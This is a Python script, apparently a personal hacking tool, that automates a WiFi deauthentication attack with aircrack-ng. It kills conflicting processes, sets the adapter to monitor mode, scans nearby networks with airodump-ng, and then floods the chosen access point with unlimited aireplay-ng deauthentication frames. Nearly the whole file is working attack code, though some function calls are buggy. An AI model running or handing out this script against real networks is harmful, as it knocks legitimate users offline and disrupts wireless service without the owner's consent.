import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime


def print_logo():
    """
    Prints my logo.
    """
    print(r'''
     _   _  ____       ____ _   __ _       _       ____              _  _  _
    | | | |/ ___|____ / ___| | / /(_)     | |     |  _ \            (_)| || |
    | |_| | |_  |__  | |_  | |/ /  _  ____| |___  | | | | ____  ___  _ | || | ___
    |  _  |  _|   / /|  _| |   <  | |/ _  `  _  \ | | | |/ _  `/ __)| || || |/ _ \
    | | | | |__  / /_| |__ | |\ \ | | (_) | | | | | |_| | (_) | |__ | || || | (_) |
    |_| |_|\____|____|\____|_| \_\|_|\__,_|_| |_| |____/ \__,_|\___)|_||_||_|\___/
    ''')
    print()
    print('   ' + '*' * 80)
    print('   *' + (' ' * 78) + '*')
    print('   *' + (' ' * 21) + f'Copyright of Hezekiah Dacillo, {datetime.today().year}' + (' ' * 22) + '*')
    print('   *' + (' ' * 78) + '*')
    print('   ' + '*' * 80)
    print()
    print()


def error(message):
    """
    Prints the error message and exits the program.
    :param message: error message
    """
    print(message)
    exit()


def check_priveledge():
    """
    Checks if the user have super user priveleges, if not dont allow to continue.
    """
    if not 'SUDO_UID' in os.environ.keys():
        error('Run this program with sudo.')


def select_wifi_interface(wifi_adapter):
    """
    Prompts the user to select wifi interface to use.
    :param wifi_adapter: list of wifi adapters
    """
    print("The following WiFi interfaces are available:")
    for index, item in enumerate(wifi_adapter):
        print(f"{index} - {item}")

    while True:
        wifi_interface_choice = input('Please select the interface you want to use for the attack: ')
        try:
            if wifi_adapter[int(wifi_interface_choice)]:
                break
        except:
            print('Please enter a number that corresponds with the choices.')
    
    selected_wifi_interface = wifi_adapter[int(wifi_interface_choice)]
    return [selected_wifi_interface, wifi_interface_choice]


def setup_wifi_adapter(wifi_adapter, selected_wifi_interface):
    """
    Sets up the selected wifi interface.
    :param wifi_adapter: list of wifi adapters
    """
    print('WiFi adapter connected!')
    print('Now let\'s kill conflicting processes:')

    # Killing all conflicting processes.
    subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'])

    print('Putting Wifi adapter into monitored mode:')
    subprocess.run(["sudo", "airmon-ng", "start", selected_wifi_interface])

    # subprocess.Popen(<list of command line arguments goes here>)
    # The output is an open file that can be accessed by other programs.
    subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", wifi_adapter[0] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def check_for_essid(essid, active_wireless_networks):
    """
    Checks if the ESSID is in the active wireless networks list. If it is return False
    Else return True to add it to the list.
    :param essid: essid
    :param active_wireless_networks: list of active wireless networks
    """
    check_status = True

    # If no ESSIDs in list add the row
    if len(active_wireless_networks) == 0:
        return check_status

    # This will only run if there are wireless access points in the list.
    for item in active_wireless_networks:
        # If True don't add to list. False will add it to list
        if essid in item['ESSID']:
            check_status = False

    return check_status


def run_process():
    """
    Runs the deauthentication process.
    """
    # Move all .csv files in the directory to a backup folder.
    for file_name in os.listdir():
        # Checks if a csv file exist.
        # It should only have one csv file as we delete them from the folder every time we run the program.
        if '.csv' in file_name:
            print('There shouldn\'t be any .csv files in your directory. We found .csv files in your directory.')
            
            # Get the current working directory.
            directory = os.getcwd()
            
            try:
                os.mkdir(directory + '/backup/')
            except:
                print('Backup folder exists.')
            timestamp = datetime.now()
            
            # Copy any .csv files in the folder to the backup folder.
            shutil.move(file_name, directory + '/backup/' + str(timestamp) + '-' + file_name)

    wlan_pattern = re.compile('^wlan[0-9]+')
    wifi_adapter = wlan_pattern.findall(subprocess.run(['iwconfig'], capture_output=True).stdout.decode())

    if len(wifi_adapter) == 0:
        error('Please connect a WiFi controller and try again.')

    selected_wifi_interface = select_wifi_interface(wifi_adapter)[0]
    wifi_interface_choice = select_wifi_interface(wifi_adapter)[1]
    setup_wifi_adapter(wifi_adapter, select_wifi_interface)
    active_wireless_networks = []

    try:
        while True:
            subprocess.call('clear', shell=True)
            for file_name in os.listdir():
                    # List of field names for the csv entries.
                    fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']

                    # Checks if a csv file exist.
                    # It should only have one csv file.
                    if '.csv' in file_name:
                        with open(file_name) as csv_h:
                            csv_h.seek(0)
                            csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                            for row in csv_reader:
                                if row['BSSID'] == 'BSSID':
                                    pass
                                elif row['BSSID'] == 'Station MAC':
                                    break
                                elif check_for_essid(row['ESSID'], active_wireless_networks):
                                    active_wireless_networks.append(row)

            print('Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n')
            print('No |\tBSSID              |\tChannel|\tESSID                         |')
            print('___|\t___________________|\t_______|\t______________________________|')
            for index, item in enumerate(active_wireless_networks):
                print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
            time.sleep(1)

    except KeyboardInterrupt:
        print()
        print('Ready to make choice.')

    while True:
        choice = input('Please select a choice from above: ')
        try:
            if active_wireless_networks[int(choice)]:
                break
        except:
            print('Please try again.')

    wifi_ssid = active_wireless_networks[int(choice)]["BSSID"]
    wifi_channel = active_wireless_networks[int(choice)]["channel"].strip()
    subprocess.run(["airmon-ng", "start", selected_wifi_interface + "mon", wifi_channel])

    # Deauthenticate clients.
    subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", wifi_ssid, wifi_adapter[int(wifi_interface_choice)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 

    try:
        while True:
            print('Deauthenticating clients, press ctrl-c to stop')
    except KeyboardInterrupt:
        print('Stop monitoring mode')
        subprocess.run(['airmon-ng', 'stop', selected_wifi_interface + 'mon'])


if __name__ == '__main__':
    print_logo()
    check_priveledge()
    run_process()
